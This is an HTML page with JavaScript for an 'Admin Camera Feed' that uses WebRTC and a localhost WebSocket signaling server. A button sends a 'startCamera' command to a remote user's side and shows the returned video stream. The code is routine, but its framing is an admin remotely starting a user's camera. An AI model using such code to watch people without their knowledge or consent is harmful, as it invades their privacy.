<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin View - Camera Access</title>
</head>
<body>
    <h1>Admin Camera Feed</h1>
    <video id="userView" width="640" height="480" autoplay></video>
    <button id="startCameraButton">Start Accessing User Camera</button>
    <p id="adminStatus"></p>

    <script>
        const userVideoElement = document.getElementById('userView');
        const statusElement = document.getElementById('adminStatus');

        // WebRTC setup
        const peerConnection = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });

        // WebSocket connection for signaling
        const signalingServer = new WebSocket('ws://localhost:3000');

        signalingServer.onmessage = async (event) => {
            const message = JSON.parse(event.data);
            handleMessage(message);
        };

        function handleMessage(message) {
            if (message.answer) {
                peerConnection.setRemoteDescription(new RTCSessionDescription(message.answer));
            } else if (message.iceCandidate) {
                peerConnection.addIceCandidate(new RTCIceCandidate(message.iceCandidate));
            }
        }

        peerConnection.ontrack = (event) => {
            userVideoElement.srcObject = event.streams[0];
        };

        peerConnection.onicecandidate = (event) => {
            if (event.candidate) {
                signalingServer.send(JSON.stringify({ iceCandidate: event.candidate }));
            }
        };

        document.getElementById('startCameraButton').addEventListener('click', () => {
            signalingServer.send(JSON.stringify({ command: "startCamera" }));
            statusElement.innerText = "Requesting user camera access...";
        });
    </script>
</body>
</html>
